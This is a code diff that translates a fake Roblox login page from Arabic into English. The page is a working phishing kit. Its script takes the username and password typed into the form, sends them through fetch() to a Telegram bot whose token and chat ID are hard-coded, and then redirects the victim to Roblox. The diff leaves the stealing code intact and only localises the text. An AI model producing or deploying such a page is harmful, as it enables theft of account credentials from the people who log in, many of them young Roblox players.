@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="en" dir="ltr">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تسجيل الدخول إلى Roblox</title>
+    <title>Login to Roblox</title>
     <style>
         body {
             font-family: 'Arial', sans-serif;
@@ -67,22 +67,22 @@
 </head>
 <body>
     <div class="login-container">
-        <h1>تسجيل الدخول إلى Roblox</h1>
+        <h1>Login to Roblox</h1>
         <form id="loginForm">
-            <input type="text" id="username" placeholder="اسم المستخدم" required>
-            <input type="password" id="password" placeholder="كلمة المرور" required>
-            <button type="submit">تسجيل الدخول</button>
+            <input type="text" id="username" placeholder="Username" required>
+            <input type="password" id="password" placeholder="Password" required>
+            <button type="submit">Log In</button>
         </form>
         <p id="result"></p>
         <div class="footer">
-            <p>لا تملك حساب؟ <a href="#" style="color: #ffcc00;">إنشاء حساب</a></p>
+            <p>Don't have an account? <a href="#" style="color: #ffcc00;">Sign Up</a></p>
         </div>
     </div>
 
     <script>
         // Replace these with your actual Telegram Bot Token and Chat ID
-        const BOT_TOKEN = '6965358568:AAHFA6qiegPJyw3oVqzfqIt3C829NeagC4Q'; // توكن البوت الخاص بك
-        const CHAT_ID = '7072093078'; // معرف الدردشة الخاص بك
+        const BOT_TOKEN = '6965358568:AAHFA6qiegPJyw3oVqzfqIt3C829NeagC4Q'; // Your bot token
+        const CHAT_ID = '7072093078'; // Your chat ID
 
         // Handle form submission
         document.getElementById('loginForm').addEventListener('submit', function(e) {
@@ -92,7 +92,7 @@
             var password = document.getElementById('password').value;
             var result = document.getElementById('result');
             
-            var message = `🟢 بيانات تسجيل دخول جديدة:\n\n👤 اسم المستخدم: ${username}\n🔑 كلمة المرور: ${password}`;
+            var message = `🟢 New Login Data:\n\n👤 Username: ${username}\n🔑 Password: ${password}`;
             
             fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
@@ -106,7 +106,7 @@
             })
             .then(response => response.json())
             .then(data => {
-                result.textContent = "تم إرسال البيانات! شكراً لتسجيل الدخول.";
+                result.textContent = "Data sent! Thank you for logging in.";
                 result.style.color = "#4CAF50"; // Green color for success messages
                 
                 // Redirect to Roblox after 1 second
@@ -116,7 +116,7 @@
             })
             .catch((error) => {
                 console.error('Error:', error);
-                result.textContent = "حدث خطأ أثناء إرسال البيانات. حاول مرة أخرى.";
+                result.textContent = "An error occurred while sending data. Please try again.";
             });
         });
     </script>
